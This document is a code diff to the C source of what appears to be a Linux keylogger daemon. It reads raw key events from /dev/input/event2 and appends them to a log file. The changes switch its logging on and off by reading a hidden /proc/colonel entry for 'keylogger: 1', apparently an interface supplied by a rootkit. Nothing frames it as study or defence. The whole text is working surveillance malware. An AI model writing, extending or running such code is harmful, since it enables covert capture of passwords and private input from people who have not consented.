@@ -21,7 +21,9 @@ int main(void) {
 	struct utsname unameData;
 	uname(&unameData);
 	char listening = 0;
-	char cmd[10];
+	char cmd[1024];
+	char kl[13] = "keylogger: 1";
+	char *toggle;
 	struct input_event ev;			/* using input_event so we know 
 									 * what we're reading from the 
 									 * event file */
@@ -40,7 +42,6 @@ int main(void) {
 	}
 
 	umask(0);						/* unmask the file mode */
-
 	sid = setsid();					/* set unique session for 
 									 * child process */
 	if (sid < 0) {
@@ -58,7 +59,7 @@ int main(void) {
 	fp = fopen("./log/log.txt", "a+"); 			/* daemon log */
 	evlog = fopen("./log/evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
-	ftty = open("/proc/cpuinfo", O_RDONLY);		/* will act as pseudo terminal */
+	// ftty = open("/proc/colonel", O_RDONLY);		/* will act as pseudo terminal */
 	
 	time_t curtime;
 	time(&curtime);
@@ -85,15 +86,19 @@ int main(void) {
 			unameData.nodename, unameData.version,
 			unameData.sysname, unameData.release, 
 			unameData.machine);
+	fflush(evlog);
 
 	/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: up, 1: down)*/
 	while(1) {
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));		/* read from /dev/input/eventX */
-		
+		ftty = open("/proc/colonel", O_RDONLY);			/* read from /proc/colonel */
 		if (0 == listening) {
 			read(ftty, cmd, sizeof(cmd));				/* read from /proc/colonel */
-			if (!strncmp(cmd, "tls", sizeof(strlen(cmd)))) {
+			toggle = strstr(cmd, kl);					/* looks for change in /proc/colonel */
+			fprintf(fp, "KEYTOGGLE: %s\n", toggle);
+			if (toggle != NULL) {
+				fprintf(fp, "In strncmp if listening: %d, cmd: %c\n", listening, cmd[strlen(cmd)-5]);
 				listening = !listening;
 				fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
 				close(ftty);
@@ -101,11 +106,18 @@ int main(void) {
 			}
 
 		} else if ((1 == ev.type) && (1 == listening)) {
-			ftty = open("/proc/cpuinfo", O_RDONLY | O_NONBLOCK);
-			read(ftty, cmd, sizeof(cmd));
-
 			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
+
+			fprintf(fp, "In 2nd if statement listening: %d\n", listening);
+			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
+			read(ftty, cmd, sizeof(cmd));
+			toggle = strstr(cmd, kl);
+			if (NULL == toggle) {
+				listening = !listening;
+				close(ftty);
+				continue;
+			}
 		}
 	}
 
